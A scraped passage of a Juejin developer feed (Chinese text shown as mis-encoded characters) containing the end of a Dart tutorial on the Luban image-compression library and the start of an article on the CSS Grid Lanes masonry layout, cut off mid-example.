  <span class="hljs-keyword">final</span> outputFile = File(<span class="hljs-string">'/path/to/output/compressed.jpg'</span>);
  
  <span class="hljs-keyword">final</span> result = <span class="hljs-keyword">await</span> Luban.compressToFile(inputFile, outputFile);
  
  <span class="hljs-keyword">if</span> (result.isSuccess) {
    <span class="hljs-keyword">final</span> compressionResult = result.value;
    <span class="hljs-built_in">print</span>(<span class="hljs-string">'å‹ç¼©å®Œæˆï¼Œæ–‡ä»¶å·²ä¿å­˜åˆ°: <span class="hljs-subst">${compressionResult.file.path}</span>'</span>);
  }
}
</code></pre>
<h4 data-id="heading-13">æŒ‡å®šè¾“å‡ºç›®å½•</h4>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-keyword">import</span> <span class="hljs-string">'dart:io'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-string">'package:luban/luban.dart'</span>;

Future&lt;<span class="hljs-keyword">void</span>&gt; compressImage() <span class="hljs-keyword">async</span> {
  <span class="hljs-keyword">final</span> inputFile = File(<span class="hljs-string">'/path/to/image.jpg'</span>);
  <span class="hljs-keyword">final</span> outputDir = Directory(<span class="hljs-string">'/path/to/output'</span>);
  
  <span class="hljs-keyword">final</span> result = <span class="hljs-keyword">await</span> Luban.compress(inputFile, outputDir: outputDir);
  
  <span class="hljs-keyword">if</span> (result.isSuccess) {
    <span class="hljs-keyword">final</span> compressionResult = result.value;
    <span class="hljs-built_in">print</span>(<span class="hljs-string">'å‹ç¼©å®Œæˆï¼Œæ–‡ä»¶å·²ä¿å­˜åˆ°: <span class="hljs-subst">${compressionResult.file.path}</span>'</span>);
  }
}
</code></pre>
<h3 data-id="heading-14">æ‰¹é‡å‹ç¼©å›¾ç‰‡</h3>
<p>æ‰¹é‡å‹ç¼©è¿”å› <code>Result&lt;BatchCompressionResult&gt;</code>ï¼Œéœ€è¦å…ˆæ£€æŸ¥æˆåŠŸæˆ–å¤±è´¥çŠ¶æ€ï¼Œç„¶åè®¿é—® <code>BatchCompressionResult</code> è·å–æ‰€æœ‰å›¾ç‰‡çš„å‹ç¼©ç»“æœã€‚</p>
<h4 data-id="heading-15">ä½¿ç”¨æ–‡ä»¶åˆ—è¡¨</h4>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-keyword">import</span> <span class="hljs-string">'dart:io'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-string">'package:luban/luban.dart'</span>;

Future&lt;<span class="hljs-keyword">void</span>&gt; compressBatchImages() <span class="hljs-keyword">async</span> {
  <span class="hljs-keyword">final</span> files = [
    File(<span class="hljs-string">'/path/to/image1.jpg'</span>),
    File(<span class="hljs-string">'/path/to/image2.jpg'</span>),
    File(<span class="hljs-string">'/path/to/image3.jpg'</span>),
  ];
  
  <span class="hljs-keyword">final</span> result = <span class="hljs-keyword">await</span> Luban.compressBatch(files);
  
  <span class="hljs-keyword">if</span> (result.isSuccess) {
    <span class="hljs-keyword">final</span> batchResult = result.value;
    <span class="hljs-built_in">print</span>(<span class="hljs-string">'æ‰¹é‡å‹ç¼©å®Œæˆ'</span>);
    <span class="hljs-built_in">print</span>(<span class="hljs-string">'æ€»æ•°: <span class="hljs-subst">${batchResult.total}</span>'</span>);
    <span class="hljs-built_in">print</span>(<span class="hljs-string">'æˆåŠŸ: <span class="hljs-subst">${batchResult.successCount}</span>'</span>);
    <span class="hljs-built_in">print</span>(<span class="hljs-string">'å¤±è´¥: <span class="hljs-subst">${batchResult.failureCount}</span>'</span>);
    
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">final</span> item <span class="hljs-keyword">in</span> batchResult.items) {
      <span class="hljs-keyword">if</span> (item.isSuccess) {
        <span class="hljs-keyword">final</span> compressionResult = item.result.value;
        <span class="hljs-built_in">print</span>(<span class="hljs-string">'<span class="hljs-subst">${item.originalPath}</span>: <span class="hljs-subst">${compressionResult.compressedSizeKb}</span> KB'</span>);
      } <span class="hljs-keyword">else</span> {
        <span class="hljs-built_in">print</span>(<span class="hljs-string">'<span class="hljs-subst">${item.originalPath}</span>: å‹ç¼©å¤±è´¥ - <span class="hljs-subst">${item.result.error}</span>'</span>);
      }
    }
  } <span class="hljs-keyword">else</span> {
    <span class="hljs-built_in">print</span>(<span class="hljs-string">'æ‰¹é‡å‹ç¼©å¤±è´¥: <span class="hljs-subst">${result.error}</span>'</span>);
  }
}
</code></pre>
<h4 data-id="heading-16">ä½¿ç”¨è·¯å¾„åˆ—è¡¨</h4>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-keyword">import</span> <span class="hljs-string">'package:luban/luban.dart'</span>;

Future&lt;<span class="hljs-keyword">void</span>&gt; compressBatchImages() <span class="hljs-keyword">async</span> {
  <span class="hljs-keyword">final</span> paths = [
    <span class="hljs-string">'/path/to/image1.jpg'</span>,
    <span class="hljs-string">'/path/to/image2.jpg'</span>,
    <span class="hljs-string">'/path/to/image3.jpg'</span>,
  ];
  
  <span class="hljs-keyword">final</span> result = <span class="hljs-keyword">await</span> Luban.compressBatchPaths(paths);
  
  result.fold(
    (error) =&gt; <span class="hljs-built_in">print</span>(<span class="hljs-string">'æ‰¹é‡å‹ç¼©å¤±è´¥: <span class="hljs-subst">$error</span>'</span>),
    (batchResult) {
      <span class="hljs-built_in">print</span>(<span class="hljs-string">'æ‰¹é‡å‹ç¼©å®Œæˆï¼ŒæˆåŠŸ <span class="hljs-subst">${batchResult.successCount}</span>/<span class="hljs-subst">${batchResult.total}</span> å¼ '</span>);
      
      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">final</span> compressionResult <span class="hljs-keyword">in</span> batchResult.successfulResults) {
        <span class="hljs-built_in">print</span>(<span class="hljs-string">'<span class="hljs-subst">${compressionResult.file.path}</span>: <span class="hljs-subst">${compressionResult.compressedSizeKb}</span> KB'</span>);
      }
    },
  );
}
</code></pre>
<h4 data-id="heading-17">æ‰¹é‡å‹ç¼©å¹¶æŒ‡å®šè¾“å‡ºç›®å½•</h4>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-keyword">import</span> <span class="hljs-string">'dart:io'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-string">'package:luban/luban.dart'</span>;

Future&lt;<span class="hljs-keyword">void</span>&gt; compressBatchImages() <span class="hljs-keyword">async</span> {
  <span class="hljs-keyword">final</span> files = [
    File(<span class="hljs-string">'/path/to/image1.jpg'</span>),
    File(<span class="hljs-string">'/path/to/image2.jpg'</span>),
  ];
  <span class="hljs-keyword">final</span> outputDir = Directory(<span class="hljs-string">'/path/to/output'</span>);
  
  <span class="hljs-keyword">final</span> result = <span class="hljs-keyword">await</span> Luban.compressBatch(files, outputDir: outputDir);
  
  <span class="hljs-keyword">if</span> (result.isSuccess) {
    <span class="hljs-keyword">final</span> batchResult = result.value;
    <span class="hljs-built_in">print</span>(<span class="hljs-string">'æ‰¹é‡å‹ç¼©å®Œæˆï¼ŒæˆåŠŸ <span class="hljs-subst">${batchResult.successCount}</span> å¼ '</span>);
    
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">final</span> compressionResult <span class="hljs-keyword">in</span> batchResult.successfulResults) {
      <span class="hljs-built_in">print</span>(<span class="hljs-string">'å‹ç¼©æ–‡ä»¶: <span class="hljs-subst">${compressionResult.file.path}</span>'</span>);
    }
  } <span class="hljs-keyword">else</span> {
    <span class="hljs-built_in">print</span>(<span class="hljs-string">'æ‰¹é‡å‹ç¼©å¤±è´¥: <span class="hljs-subst">${result.error}</span>'</span>);
  }
}
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[CSS æ–°ç‰¹æ€§ï¼ç€‘å¸ƒæµå¸ƒå±€çš„ç»ˆæè§£å†³æ–¹æ¡ˆ]]></title>    <link>https://juejin.cn/post/7592805973120401414</link>    <guid>https://juejin.cn/post/7592805973120401414</guid>    <pubDate>2026-01-08T09:11:12.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592805973120401414" data-draft-id="7592555965792141318" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="CSS æ–°ç‰¹æ€§ï¼ç€‘å¸ƒæµå¸ƒå±€çš„ç»ˆæè§£å†³æ–¹æ¡ˆ"/> <meta itemprop="keywords" content="å‰ç«¯,JavaScript,CSS"/> <meta itemprop="datePublished" content="2026-01-08T09:11:12.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å†´ç¾½"/> <meta itemprop="url" content="https://juejin.cn/user/712139234359182"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            CSS æ–°ç‰¹æ€§ï¼ç€‘å¸ƒæµå¸ƒå±€çš„ç»ˆæè§£å†³æ–¹æ¡ˆ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/712139234359182/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å†´ç¾½
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T09:11:12.000Z" title="Thu Jan 08 2026 09:11:12 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    2
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»9åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å‰è¨€</h2>
<p>å‰ç«¯å¼€å‘ä¸€ç›´æœ‰ä¸€ä¸ªè€å¤§éš¾çš„é—®é¢˜ï¼Œé‚£å°±æ˜¯â€”â€”ç€‘å¸ƒæµå¸ƒå±€ã€‚</p>
<p>æ•ˆæœéœ€æ±‚å¹¶ä¸å¤æ‚ï¼šå¡ç‰‡é”™è½ï¼Œå‚å·®æœ‰è‡´ï¼Œçœ‹èµ·æ¥é«˜çº§ï¼Œæ»šåŠ¨èµ·æ¥æµç•…ã€‚</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4cb461618ba048129a3671b86e837821~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya05769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768469734&amp;x-signature=2SRdg%2BBxLzjywu%2BafHIsBcimrBo%3D" alt="" loading="lazy"/></p>
<p>å°±æ˜¯è¿™æ ·ä¸€ä¸ªçœ‹ä¼¼ç®€å•çš„æ•ˆæœï¼Œå…¶å®å·²ç»å›°æ‰°äº†å‰ç«¯å¼€å‘è€…å¥½å¤šå¹´ã€‚</p>
<p>è¦å¼•å…¥ JavaScript åº“ï¼Œè¦è®©å†…å®¹æ™ºèƒ½å¡«å……ï¼Œè¦å®ç°å“åº”å¼å¸ƒå±€ï¼Œå†™æ— æ•°ä¸ªåª’ä½“æŸ¥è¯¢ï¼Œè¦å®ç°æ— é™æ»šåŠ¨åŠ è½½ï¼Œè¦ç”¨ JavaScript å¤„ç†å¤æ‚çš„å¸ƒå±€é€»è¾‘â€¦â€¦</p>
<p>ç°åœ¨ï¼Œç»è¿‡ Mozillaã€è‹¹æœ WebKit å›¢é˜Ÿã€CSS å·¥ä½œç»„å’Œæ‰€æœ‰æµè§ˆå™¨çš„å¤šè½®è®¨è®ºï¼Œå®ƒç»ˆäºæœ‰äº†ç»ˆæè§£å†³æ–¹æ¡ˆï¼</p>
<p>è¿™å°±æ˜¯ <strong>CSS Grid Lanes</strong>ã€‚</p>
<p>ä¸”è®©æˆ‘ä»¬å…ˆç¿»è¯‘å®ƒä¸ºâ€œCSS ç½‘æ ¼è½¦é“â€å§ã€‚</p>
<p>ä¹‹æ‰€ä»¥å«è½¦é“ï¼Œæƒ³è±¡ä¸€ä¸‹é«˜é€Ÿå…¬è·¯ï¼šæœ‰å¥½å‡ æ¡è½¦é“ï¼Œè½¦è¾†ä¼šè‡ªåŠ¨é€‰æ‹©æœ€çŸ­çš„é‚£æ¡è½¦é“æ’é˜Ÿã€‚</p>
<p>CSS Grid Lanes å°±æ˜¯è¿™ä¸ªåŸç†â€”â€”ä½ å…ˆå®šä¹‰å¥½æœ‰å‡ æ¡â€œè½¦é“â€ï¼ˆåˆ—ï¼‰ï¼Œç½‘é¡µå†…å®¹ä¼šè‡ªåŠ¨å¡«å……åˆ°æœ€çŸ­çš„é‚£ä¸€åˆ—ï¼Œå°±åƒè½¦è¾†è‡ªåŠ¨é€‰æ‹©æœ€ä¸æ‹¥å µçš„è½¦é“ä¸€æ ·ã€‚</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/70e233f775d7494e97683ef53e2c76a9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya05769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768469734&amp;x-signature=%2Fy1sj6MSxm8u7jN5GAb6JeFfJGw%3D" alt="" loading="lazy"/></p>
<p>å…·ä½“ä½¿ç”¨èµ·æ¥ä¹Ÿå¾ˆç®€å•ï¼Œä¸‰è¡Œä»£ç å°±èƒ½å®ç°ï¼š</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.container</span> {
  <span class="hljs-attribute">display</span>: grid-lanes;
  <span class="hljs-attribute">grid-template-columns</span>: <span class="hljs-built_in">repeat</span>(auto-fill, <span class="hljs-built_in">minmax</span>(<span class="hljs-number">250px</span>, <span class="hljs-number">1</span>fr));
  <span class="hljs-attribute">gap</span>: <span class="hljs-number">16px</span>;
}
</code></pre>
<h2 data-id="heading-1">å®ç°åŸç†</h2>
<p>ç°åœ¨ï¼Œè®©æˆ‘ä»¬æ¥ç»†è‡´è®²è§£ä¸‹å¦‚ä½•å®ç°å¼€å¤´å›¾ä¸­çš„ç€‘å¸ƒæµæ•ˆæœã€‚</p>
<p>é¦–å…ˆæ˜¯ HTML ä»£ç ï¼š</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">main</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"container"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">figure</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"photo-1.jpg"</span> /&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">figure</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">figure</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"photo-2.jpg"</span> /&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">figure</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">figure</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"photo-3.jpg"</span> /&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">figure</span>&gt;</span>
  <span class="hljs-comment">&lt;!-- etc --&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">main</span>&gt;</span>
</code></pre>
<p>ç„¶åæ˜¯ CSS ä»£ç ï¼š</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.container</span> {
  <span class="hljs-attribute">display</span>: grid-lanes;
  <span class="hljs-attribute">grid-template-columns</span>: <span class="hljs-built_in">repeat</span>(auto-fill, <span class="hljs-built_in">minmax</span>(<span class="hljs-number">250px</span>, <span class="hljs-number">1</span>fr));
  <span class="hljs-attribute">gap</span>: <span class="hljs-number">16px</span>;
}
</code></pre>
<p>ä»£ç ä¸€å…± 3 è¡Œã€‚</p>
<p><code>display: grid-lanes</code> åˆ›å»ºç½‘æ ¼å®¹å™¨ï¼Œä½¿ç”¨ç€‘å¸ƒæµå¸ƒå±€ã€‚</p>
<p><code>grid-template-columns</code> åˆ›å»ºè½¦é“ï¼Œæˆ‘ä»¬å°†å€¼è®¾ä¸º <code>repeat(auto-fill, minmax(250px, 1fr))</code>ï¼Œ<strong>æ„æ€æ˜¯è‡³å°‘ 250 åƒç´ å®½çš„çµæ´»åˆ—ã€‚æµè§ˆå™¨å†³å®šåˆ›å»ºå¤šå°‘åˆ—ï¼Œå¹¶å¡«å……æ‰€æœ‰å¯ç”¨ç©ºé—´ã€‚</strong></p>
<p><code>gap: 16px</code>è¡¨ç¤ºè½¦é“ä¹‹é—´æœ‰ 16px çš„é—´æ­‡ã€‚</p>
<p>å°±æ˜¯è¿™ä¹ˆç®€å•ã€‚</p>
<p><strong>3 è¡Œ CSS ä»£ç ï¼Œæ— éœ€ä»»ä½•åª’ä½“æŸ¥è¯¢æˆ–å®¹å™¨æŸ¥è¯¢ï¼Œæˆ‘ä»¬å°±åˆ›å»ºäº†ä¸€ä¸ªé€‚ç”¨äºæ‰€æœ‰å±å¹•å°ºå¯¸çš„çµæ´»å¸ƒå±€ã€‚</strong></p>
<hr/>
<p>æ›´ç»çš„æ˜¯ï¼Œè¿™ç§å¸ƒå±€èƒ½è®©ç”¨æˆ·é€šè¿‡ Tab é”®åœ¨å„ä¸ªæ ç›®ä¹‹é—´åˆ‡æ¢ï¼Œè®¿é—®æ‰€æœ‰å½“å‰å¯è§çš„å†…å®¹ï¼ˆè€Œä¸æ˜¯åƒä»¥å‰é‚£æ ·ï¼Œå…ˆæ»šåŠ¨åˆ°ç¬¬ä¸€åˆ—åº•éƒ¨ï¼Œç„¶åå†è¿”å›ç¬¬äºŒåˆ—é¡¶éƒ¨ï¼‰ã€‚</p>
<p>å®ƒä¹Ÿæ”¯æŒä½ å®ç°æ— é™å¾ªç¯åŠ è½½ï¼Œéšç€ç”¨æˆ·æ»šåŠ¨é¡µé¢ï¼Œå†…å®¹æ— é™åŠ è½½ï¼Œè€Œæ— éœ€ä½¿ç”¨ JavaScript æ¥å¤„ç†å¸ƒå±€ã€‚</p>
<h2 data-id="heading-2">åŠŸèƒ½å¼ºå¤§</h2>
<h3 data-id="heading-3">ä¸åŒè½¦é“å°ºå¯¸</h3>
<p>Grid Lanes å……åˆ†åˆ©ç”¨äº† CSS Grid çš„å¼ºå¤§åŠŸèƒ½ <code>grid-template-*</code>æ¥å®šä¹‰è½¦é“ï¼Œæ‰€ä»¥å¾ˆå®¹æ˜“åˆ›å»ºå‡ºå¯Œæœ‰åˆ›æ„çš„å¸ƒå±€ã€‚</p>
<p>ä¾‹å¦‚ï¼Œæˆ‘ä»¬å¯ä»¥åˆ›å»ºä¸€ä¸ªå¸ƒå±€ï¼Œå…¶ä¸­çª„åˆ—å’Œå®½åˆ—äº¤æ›¿å‡ºç°â€”â€”å³ä½¿åˆ—æ•°éšè§†å£å¤§å°è€Œå˜åŒ–ï¼Œç¬¬ä¸€åˆ—å’Œæœ€åä¸€åˆ—ä¹Ÿå§‹ç»ˆæ˜¯çª„åˆ—ã€‚</p>
<p>å®ç°ä¹Ÿå¾ˆç®€å•ï¼š</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-attribute">grid-template-columns</span>: <span class="hljs-built_in">repeat</span>(auto-fill, <span class="hljs-built_in">minmax</span>(<span class="hljs-number">8rem</span>, <span class="hljs-number">1</span>fr) <span class="hljs-built_in">minmax</span>(<span class="hljs-number">16rem</span>, <span class="hljs-number">2</span>fr)) <span class="hljs-built_in">minmax</span>(<span class="hljs-number">8rem</span>, <span class="hljs-number">1</span>fr);
</code></pre>
<p>æ•ˆæœå¦‚ä¸‹ï¼š</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e43e4b7a0c2542d8b72e051b7d03b610~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya05769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768469734&amp;x-signature=Hiz5pxxyzUR8shGz%2B2RsEFv8e6k%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-4">è·¨è½¦é“</h3>
<p>ç”±äºæˆ‘ä»¬æ‹¥æœ‰ç½‘æ ¼å¸ƒå±€çš„å…¨éƒ¨åŠŸèƒ½ï¼Œæˆ‘ä»¬å½“ç„¶ä¹Ÿå¯ä»¥è·¨è¶Šè½¦é“ã€‚</p>
<p>æ•ˆæœå¦‚ä¸‹ï¼š</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e9ddaa092544490eaed6ac584bafd1ab~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya05769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768469734&amp;x-signature=fbRtAt2XS%2FPCCyJKxciCTkxIoQs%3D" alt="" loading="lazy"/></p>
<p>å®ç°ä»£ç ï¼š</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-tag">main</span> {
  <span class="hljs-attribute">display</span>: grid-lanes;
  <span class="hljs-attribute">grid-template-columns</span>: <span class="hljs-built_in">repeat</span>(auto-fill, <span class="hljs-built_in">minmax</span>(<span class="hljs-number">20ch</span>, <span class="hljs-number">1</span>fr));
  <span class="hljs-attribute">gap</span>: <span class="hljs-number">2</span>lh;
}
<span class="hljs-selector-tag">article</span> {
  <span class="hljs-attribute">grid-column</span>: span <span class="hljs-number">1</span>;
}
<span class="hljs-keyword">@media</span> (<span class="hljs-number">1250px</span> &lt; <span class="hljs-attribute">width</span>) {
  <span class="hljs-selector-tag">article</span><span class="hljs-selector-pseudo">:nth-child</span>(<span class="hljs-number">1</span>) {
    <span class="hljs-attribute">grid-column</span>: span <span class="hljs-number">4</span>;
  }
  <span class="hljs-selector-tag">article</span><span class="hljs-selector-pseudo">:nth-child</span>(<span class="hljs-number">2</span>),
  <span class="hljs-selector-tag">article</span><span class="hljs-selector-pseudo">:nth-child</span>(<span class="hljs-number">3</span>),
  <span class="hljs-selector-tag">article</span><span class="hljs-selector-pseudo">:nth-child</span>(<span class="hljs-number">4</span>),
  <span class="hljs-selector-tag">article</span><span class="hljs-selector-pseudo">:nth-child</span>(<span class="hljs-number">5</span>),
  <span class="hljs-selector-tag">article</span><span class="hljs-selector-pseudo">:nth-child</span>(<span class="hljs-number">6</span>),
  <span class="hljs-selector-tag">article</span><span class="hljs-selector-pseudo">:nth-child</span>(<span class="hljs-number">7</span>),
  <span class="hljs-selector-tag">article</span><span class="hljs-selector-pseudo">:nth-child</span>(<span class="hljs-number">8</span>) {
    <span class="hljs-attribute">grid-column</span>: span <span class="hljs-number">2</span>;
  }
}
</code></pre>
<h3 data-id="heading-5">æ”¾ç½®é¡¹ç›®</h3>
<p>æˆ‘ä»¬ä¹Ÿå¯ä»¥åœ¨ä½¿ç”¨ç½‘æ ¼è½¦é“æ—¶æ˜¾å¼åœ°æ”¾ç½®é¡¹ç›®ã€‚è¿™æ—¶ï¼Œæ— è®ºæœ‰å¤šå°‘åˆ—ï¼Œæ ‡é¢˜å§‹ç»ˆä½äºæœ€åä¸€åˆ—ã€‚</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6e0c285c55e548109ef576fb38505b25~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya05769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768469734&amp;x-signature=WMczSVgEgOXgBErcyNPJlP9HkHU%3D" alt="" loading="lazy"/></p>
<p>å®ç°ä»£ç ä¸ºï¼š</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-tag">main</span> {
  <span class="hljs-attribute">display</span>: grid-lanes;
  <span class="hljs-attribute">grid-template-columns</span>: <span class="hljs-built_in">repeat</span>(auto-fill, <span class="hljs-built_in">minmax</span>(<span class="hljs-number">24ch</span>, <span class="hljs-number">1</span>fr));
}
<span class="hljs-selector-tag">header</span> {
